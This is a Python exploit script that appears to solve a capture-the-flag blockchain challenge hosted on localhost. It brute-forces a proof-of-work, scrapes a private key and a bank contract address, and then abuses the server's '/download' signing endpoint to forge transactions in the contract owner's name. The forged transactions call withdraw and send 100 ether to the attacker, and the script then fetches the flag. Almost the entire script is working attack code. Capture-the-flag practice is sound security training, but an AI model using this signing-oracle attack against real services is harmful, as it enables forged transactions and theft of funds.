from web3 import Web3
from eth_utils import keccak, to_bytes, to_hex
from eth_account.messages import encode_defunct
from eth_account import Account
from pathlib import Path
from hexbytes import HexBytes
from base64 import b64encode, b64decode
import requests
import json
import rlp
import requests
import re
from hashlib import sha256
from bs4 import BeautifulSoup

Account.enable_unaudited_hdwallet_features()

url = "http://localhost:5000"
target = "0000"
s = requests.Session() 
r = s.get(url)

print("session",r.cookies)

# get ticket
ticket = re.search(r"ticket = \"([0-9a-f]+)\"", r.text).group(1)

for i in range(1000000000):
    if sha256(f"{ticket}{i}".encode()).hexdigest().startswith(target):
        answer = i
        break

# send answer
s.post(f"{url}/launch", json={"answer": answer})

#get rpc, pvKey, bank address
r = s.get(url)
rpc = re.search(r"Copy RPC\">(http://[^<]+)", r.text).group(1)
pvKey = re.search(r"Copy Private Key\">(0x[0-9a-fA-F]+)", r.text).group(1)
bankAddress = re.search(r"Copy Bank Address\">(0x[0-9a-fA-F]+)", r.text).group(1)
user = Account.from_key(pvKey).address
print("rpc",rpc)
print("pvKey",pvKey)
print("bankAddress",bankAddress)
print("user",user)


web3 = Web3(Web3.HTTPProvider(rpc))
contract = web3.eth.contract(address=bankAddress, abi=json.loads(Path("./Bank.json").read_text())["abi"])
deployer = contract.functions.owner().call()
print("owner",deployer)

nonce = web3.eth.get_transaction_count(deployer)
balance = web3.eth.get_balance(user)

print(f"before user balance: {balance/10**18}")

calldata = "3ccfd60b".ljust(64, "0")
tx1 = {
    'to': bankAddress,
    'value': b'',
    'gas': 2000000,
    'nonce': nonce if nonce else b'',
    'chainId': 12345,
    'maxFeePerGas': 1000000000,
    'maxPriorityFeePerGas': 1000000000,
    'data': '0x' + calldata
}

tx2 = {
    'to': user,
    'value': hex(100 * 10 ** 18),
    'gas': 2000000,
    'nonce': nonce + 1 if nonce else b'',
    'chainId': 12345,
    'maxFeePerGas': 1000000000,
    'maxPriorityFeePerGas': 1000000000,
    'data': b''
}

rlp_encode_1 = rlp.encode(
    [   
        to_bytes(tx1['chainId']),
        to_bytes(tx1['nonce']),
        to_bytes(tx1['maxPriorityFeePerGas']),
        to_bytes(tx1['maxFeePerGas']),
        to_bytes(tx1['gas']),
        to_bytes(hexstr=tx1['to']),
        to_bytes(tx1['value']),
        to_bytes(hexstr=tx1['data']),
        [],
    ]
)

rlp_encode_2 = rlp.encode(
    [
        to_bytes(tx2['chainId']),
        to_bytes(tx2['nonce']),
        to_bytes(tx2['maxPriorityFeePerGas']),
        to_bytes(tx2['maxFeePerGas']),
        to_bytes(tx2['gas']),
        to_bytes(hexstr=tx2['to']),
        to_bytes(hexstr=tx2['value']),
        tx2['data'],
        [],
    ]
)

tx1_hash = keccak(b'\x02'+rlp_encode_1)
tx2_hash = keccak(b'\x02'+rlp_encode_2)

print("tx1 hash",tx1_hash.hex())
print("tx2 hash",tx2_hash.hex())    

r = s.get(f"{url}/download",params={"receiver":"","amount":"","fee":"","code":b64encode(b'\x02'+rlp_encode_1)})
v1 = re.search(r"v=([0-9]+)", r.text).group(1)
r1 = re.search(r"r=([0-9]+)", r.text).group(1)
s1 = re.search(r"s=([0-9]+)", r.text).group(1)
print(v1,r1,s1)

signed_rlp_encode_1 = rlp.encode(
    [
        to_bytes(tx1['chainId']),
        to_bytes(tx1['nonce']),
        to_bytes(tx1['maxPriorityFeePerGas']),
        to_bytes(tx1['maxFeePerGas']),
        to_bytes(tx1['gas']),
        to_bytes(hexstr=tx1['to']),
        to_bytes(tx1['value']),
        to_bytes(hexstr=tx1['data']),
        [],
        to_bytes(int(v1)),
        to_bytes(int(r1)),
        to_bytes(int(s1)),
    ]
)

signed_transaction_1 = b'\x02' + signed_rlp_encode_1
rcpt = web3.eth.send_raw_transaction(signed_transaction_1)
print("tx1",rcpt.hex())

r = s.get(f"{url}/download",params={"receiver":"","amount":"","fee":"","code":b64encode(b'\x02'+rlp_encode_2)})
v2 = re.search(r"v=([0-9]+)", r.text).group(1)
r2 = re.search(r"r=([0-9]+)", r.text).group(1)
s2 = re.search(r"s=([0-9]+)", r.text).group(1)
print(v2,r2,s2)

signed_rlp_encode_2 = rlp.encode(
    [
        to_bytes(tx2['chainId']),
        to_bytes(tx2['nonce']),
        to_bytes(tx2['maxPriorityFeePerGas']),
        to_bytes(tx2['maxFeePerGas']),
        to_bytes(tx2['gas']),
        to_bytes(hexstr=tx2['to']),
        to_bytes(hexstr=tx2['value']),
        tx2['data'],
        [],
        to_bytes(int(v2)),
        to_bytes(int(r2)),
        to_bytes(int(s2)),
    ]
)


signed_transaction_2 = b'\x02' + signed_rlp_encode_2
rcpt = web3.eth.send_raw_transaction(signed_transaction_2)
print("tx2",rcpt.hex())

deployer_balance = web3.eth.get_balance(deployer)
print(f"deployer balance: {deployer_balance/10**18}")
balance = web3.eth.get_balance(user)
print(f"user balance: {balance/10**18}")

rcpt = web3.eth.send_transaction({
    "from": user,
    "to": bankAddress,
    "value": 100 * 10 ** 18,
    "gas": 2000000,
    "nonce": web3.eth.get_transaction_count(user),
})

print("tx3",rcpt.hex())

balance = contract.functions.balance(user).call()
print(f"user bank balance: {balance/10**18}")

r = s.get(f"{url}/vip")
flag = re.search(r"cce2024\{[^}]+\}", r.text).group()
print("flag",flag)
# """
# [
# HexBytes('0x7a69'), -> chainId
# HexBytes('0x04'), -> nonce
# HexBytes('0x3b9aca00'), -> maxPriorityFeePerGas
# HexBytes('0x3b9aca00'), -> maxFeePerGas
# HexBytes('0x1e8480'), -> gas
# HexBytes('0x0000000000000000000000000000000000000000'), -> to
# HexBytes('0x0de0b6b3a7640000'), -> amount
# HexBytes('0x'), -> data
# [], -> access_list
# HexBytes('0x01'), -> y parity
# HexBytes('0xfc443497783bc69b6599a75bc23ca5e4f17796533135eb7ec4f9f1298d8f66ed'), -> r
# HexBytes('0x557e5419d3decebc038edfcf31de79c1003889358a06d3b9a7d0cbbce0730097') -> s
# ]
# """